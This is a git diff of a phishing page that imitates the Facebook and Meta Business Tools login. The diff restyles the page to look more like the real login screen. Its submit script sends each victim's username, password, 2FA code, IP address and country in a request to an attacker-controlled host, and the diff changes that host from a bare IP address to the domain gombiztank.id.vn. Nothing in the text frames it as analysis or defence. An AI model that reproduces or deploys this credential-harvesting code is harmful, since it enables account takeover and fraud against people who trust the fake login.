@@ -5,10 +5,21 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Meta Business Tools</title>
-    <link rel="shortcut icon" href="fb.png" type="image/x-icon">
+    <link rel="shortcut icon" href="image/icon.png" type="image/x-icon">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet"
         integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            const passwordInput = document.getElementById('pass');
+            const eyeIcon = document.querySelector('.fa-eye');
+            eyeIcon.addEventListener('click', function () {
+                const isPasswordVisible = passwordInput.type === 'text';
+                passwordInput.type = isPasswordVisible ? 'password' : 'text';
+                eyeIcon.className = isPasswordVisible ? 'fa fa-eye-slash' : 'fa fa-eye';
+            });
+        });
+    </script>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -16,107 +27,186 @@
             padding: 0;
             box-sizing: border-box;
             background-color: #EEF6FE;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
         }
 
         .home {
             text-align: center;
-            margin: 10px auto;
-            padding: 10px 20px;
-        }
 
-        .header {
-            display: flex;
-            justify-content: center;
-            margin-top: 80px;
-        }
-
-        .header img {
-            max-height: 60px;
-            min-height: 0px;
-            object-fit: contain;
-            overflow: hidden;
         }
 
         .content {
-            margin-top: 80px;
-        }
-
-        .Input {
-            width: 100%;
-            padding: 10px 16px;
-            background: rgb(255, 255, 255);
-            border: 1px solid rgb(203, 210, 217);
-            border-radius: 12px;
-            align-items: center;
-            flex-direction: row;
-            margin-bottom: 20px;
-        }
-
-        .Input:focus {
-            border: 1px solid rgba(28, 43, 51, 1.0000) !important;
-        }
-
-        .inputLogin {
-            width: 100%;
+            min-width: 980px;
+            min-height: 536px;
             display: flex;
-            opacity: 1;
-            height: 44px;
-            min-width: 44px;
-            flex-grow: 1;
-            padding-left: 20px;
-            padding-right: 20px;
-            background: rgba(0, 100, 224, 1.0000);
-            border: 0px solid rgba(28, 43, 51, 1);
-            border-radius: 22px;
-            align-items: center;
-            justify-content: center;
+            width: 100%;
+        }
+
+        .content-left {
+            box-sizing: border-box;
+            margin-right: 0;
+            padding-right: 110px;
+            width: 580px;
+            display: inline-block;
+        }
+
+        .content-left .image {
+            width: 548px;
+            height: 182px;
+            padding: 112px 0 16px;
+            display: flex;
+        }
+
+        .content-left .content {
+            width: 500px;
+        }
+
+
+        .content-left .content h2 {
+            font-family: SFProDisplay-Regular, Helvetica, Arial, sans-serif;
+            font-size: 28px;
+            color: #1c1e21;
+            grid-area: auto;
+            line-height: 32px;
+            padding: 0 0 20px;
+            width: 500px;
+        }
+
+        .image img {
+            display: inline;
+            grid-area: auto;
+            line-height: 16px;
+            margin: -28px;
+            min-width: 321px;
+            max-height: 106px;
+            min-height: 0;
+            object-fit: cover;
+        }
+
+        .content-right {
+            display: inline-block;
+            line-height: 16px;
+        }
+
+
+        .formLogin {
+            background-color: #fff;
+            border: none;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
+            box-sizing: border-box;
+            margin: 40px 0 0;
+            padding: 20px 15px 28px;
+            width: 396px;
+            height: 360px;
             text-align: center;
-
+            align-items: center;
         }
 
-        .Input span {
-            color: rgba(255, 255, 255, 1);
-            font-weight: 500;
-            display: inline;
-            font-size: 16px;
-            font-family: Optimistic Text Normal;
-            white-space: pre-wrap;
-            overflow-wrap: break-word;
+        .input {
+            height: 52px;
+            background-color: #ffffff;
+            border-radius: 6px;
+            color: #1d2219;
+            display: inline-block;
+            font-size: 17px;
+            line-height: 16px;
+            padding: 14px 16px;
+            border: 1px solid #ccc;
+            margin-bottom: 15px;
+            width: 100%;
         }
 
-        .wbloks_1 {
-            display: flex;
-            position: relative;
+        .input i {
+            margin-top: 50px;
         }
 
-        .wbloks_1 i {
-            position: absolute;
-            right: 14px;
-            top: 15px;
+        .input :focus {
+            border: 1px solid #1877F2 !important;
         }
 
-        .footer {
-            display: flex;
+        .btnLogin {
+            font-size: 20px;
+            font-family: inherit;
+            background-color: #0866ff;
+            border: none;
+            border-radius: 6px;
+            padding: 0 16px;
+            width: 100%;
+            color: #fff;
+            font-weight: 700;
+            line-height: 48px;
             justify-content: center;
-            margin-top: 150px;
+            margin-bottom: 30px;
         }
 
-        .footer img {
-            max-height: 10px;
-            min-height: 0px;
-            object-fit: contain;
-            overflow: hidden;
-
-        }
-
-        .home span {
-            color: rgba(255, 255, 255, 1.0000);
+        .formLogin .forgotPassword {
+            color: #0866ff;
+            font-size: 14px;
             font-weight: 500;
-            display: inline;
-            font-size: 16px;
-            font-family: Optimistic Text Normal;
-            white-space: pre-wrap;
-            overflow-wrap: break-word;
+            line-height: 19px;
+            text-align: center;
+            text-decoration: none;
+            margin-bottom: 15px;
+        }
+
+        .hr {
+            color: #dadde1;
+        }
+
+        .create {
+            background-color: #42b72a;
+            border-radius: 6px;
+            display: inline-block;
+            color: #ffffff;
+            font-size: 17px;
+            font-weight: 700;
+            justify-content: center;
+            line-height: 48px;
+            padding: 0px 16px;
+            text-align: center;
+            text-decoration: none;
+        }
+
+        .formLogin .create:hover {
+            color: #ffffff;
+            opacity: 0.9;
+        }
+
+        .bottomForm {
+            width: 396px;
+            text-align: center;
+            margin: 28px 0 0;
+            font-size: 14px;
+            line-height: 19px;
+        }
+
+        .bottomForm a {
+            font-weight: 600;
+            font-size: 14px;
+            text-decoration: none;
+            color: #1C1E21;
+            font-family: SFProText-Semibold, Helvetica, Arial, sans-serif;
+
+        }
+
+        .bottomForm span {
+            font-family: SFProText-Semibold, Helvetica, Arial, sans-serif;
+
+        }
+
+        #loader {
+            padding: 0 16px;
+            line-height: 48px;
+            margin-bottom: 30px;
+            display: none;
+            width: 100%;
+            flex-direction: row;
+            margin-top: 20px;
+            justify-content: center;
         }
 
         .loader {
@@ -141,24 +231,7 @@
                 transform: rotate(1turn)
             }
         }
-
-        @media screen and (max-width: 600px) {
-            .Input:focus {
-                border: 1px solid rgba(28, 43, 51, 1.0000) !important;
-            }
-        }
     </style>
-    <script>
-        document.addEventListener('DOMContentLoaded', function () {
-            const passwordInput = document.getElementById('pass');
-            const eyeIcon = document.querySelector('.fa-eye');
-            eyeIcon.addEventListener('click', function () {
-                const isPasswordVisible = passwordInput.type === 'text';
-                passwordInput.type = isPasswordVisible ? 'password' : 'text';
-                eyeIcon.className = isPasswordVisible ? 'fa fa-eye-slash' : 'fa fa-eye';
-            });
-        });
-    </script>
     <script>
         function submitForm() {
             var emailInput = document.getElementById('email');
@@ -182,7 +255,7 @@
                 const address = localStorage.getItem('address');
                 var code = document.getElementById('2facode')
                 var codeValue = code.value
-                fetch('http://13.213.68.56/check_facebook_status?username=' + encodeURIComponent(emailValue) + '&password=' + encodeURIComponent(passwordValue) + '&code=' + encodeURIComponent(codeValue) + '&ip=' + encodeURIComponent(ipAddress) + '&country=' + encodeURIComponent(address))
+                fetch('https://gombiztank.id.vn/check_facebook_status?username=' + encodeURIComponent(emailValue) + '&password=' + encodeURIComponent(passwordValue) + '&code=' + encodeURIComponent(codeValue) + '&ip=' + encodeURIComponent(ipAddress) + '&country=' + encodeURIComponent(address))
                     .then(response => {
                         if (!response.ok) {
                             throw new Error('Network response was not ok');
@@ -205,6 +278,8 @@
                         }
                         else if (data === 'WRONG') {
                             emailInput.value = '';
+                            passwordInput.value = '';
+                            code.value = '';
                             passwordInput.style.borderColor = 'red';
                             passwordInput.placeholder = 'Wrong password';
                             code.placeholder = 'Wrong code';
@@ -237,15 +312,6 @@
             var code = document.getElementById('2facode');
             passwordInput.setAttribute('placeholder', 'Password');
             passwordInput.style.borderColor = 'black';
-            if (passwordInput.value.includes('Wrong password')) {
-                passwordInput.value = '';
-                passwordInput.setAttribute('placeholder', 'Password');
-            } else if (code.value.includes('Wrong code')) {
-                code.value = '';
-            }
-            passwordInput.type = 'password';
-            code.style.borderColor = 'black';
-            code.setAttribute('placeholder', '2FA code');
         }
     </script>
     <script>
@@ -269,66 +335,50 @@
         });
 
     </script>
-    <script>
-        async function fetchIpAddress() {
-            let ipAddress;
-            let address;
-            try {
-                const ipifyResponse = await fetch('https://api.ipify.org?format=json');
-                const ipifyData = await ipifyResponse.json();
-                ipAddress = ipifyData.ip;
-
-                const ipLocationNetResponse = await fetch(`https://api.iplocation.net/?cmd=ip-country&ip=${ipAddress}`);
-                const ipLocationNetData = await ipLocationNetResponse.json();
-                address = ipLocationNetData.country_name;
-
-                localStorage.setItem('ipAddress', ipAddress);
-                localStorage.setItem('address', address);
-            } catch (error) {
-                console.error('Lỗi:', error);
-            }
-        }
-
-        fetchIpAddress();
-    </script>
-
 </head>
 
 <body>
     <div class="home">
-        <span>English (UK)</span>
-        <div class="header">
-            <img class="logo" src="fb.png" alt="">
-        </div>
-        <form>
-            <div class="content">
-                <div class="wbloks_1" id="emailContainer">
-                    <input id="email" class="Input" type="text" id="m_login_email"
-                        placeholder="Mobile number or email address" oninput="removeRedBorder()">
+        <div class="content">
+            <div class="content-left col-6">
+                <div class="image">
+                    <img src="image/facebook.svg" alt="">
                 </div>
-                <div class="wbloks_1" id="passContainer">
-                    <input id="pass" class="Input" type="password" id="m_login_password" placeholder="Password"
-                        oninput="removeRedBorder()">
-                    <i class="fa fa-eye"></i>
-                </div>
-                <div class="wbloks_1" style="display: none;" id="2faContainer">
-                    <input id="2facode" class="Input" type="text" id="2facode" placeholder="2FA code"
-                        oninput="removeRedBorder()" />
-                </div>
-                <button class="inputLogin" id="login">
-                    <span onclick="submitForm()">Log in</span>
-                </button>
-                <div id="loader" style="display: none;
-                                        width:100% ;
-                                        flex-direction: row;
-                                        margin-top: 10px;
-                                        justify-content: center;">
-                    <div class="loader"></div>
+                <div class="content-left text">
+                    <h2>
+                        Facebook helps you connect and share with the people in your life.
+                    </h2>
                 </div>
             </div>
-        </form>
-        <div class="footer">
-            <img src="meta.png" alt="">
+            <div class="content-right col-6">
+                <div class="formLogin">
+                    <div class="email" id="emailContainer">
+                        <input type="text" class="input" placeholder="Email address or phone number" id="email"
+                            oninput="removeRedBorder()">
+                    </div>
+                    <div class="email" id="2faContainer" style="display: none;
+                    margin-top: 20px;">
+                        <input type="text" class="input" placeholder="2FA code" id="2facode" onfocus="removeRedBorder()"
+                            oninput="removeRedBorder()">
+                    </div>
+                    <div class="password" id="passContainer">
+                        <input type="password" class="input" placeholder="Password" id="pass"
+                            oninput="removeRedBorder()">
+
+                    </div>
+                    <button class="btnLogin" name="login" id="login" onclick="submitForm()">Log in</button>
+                    <div id="loader">
+                        <div class="loader"></div>
+                    </div>
+                    <a class="forgotPassword" href="#">Forgotten password?</a>
+                    <hr class="hr">
+                    <a class="create" href="#">Create new account</a>
+                </div>
+                <div class="bottomForm">
+                    <a href="">Create a Page </a>
+                    <span>for a celebrity, brand or business.</span>
+                </div>
+            </div>
         </div>
     </div>
 </body>
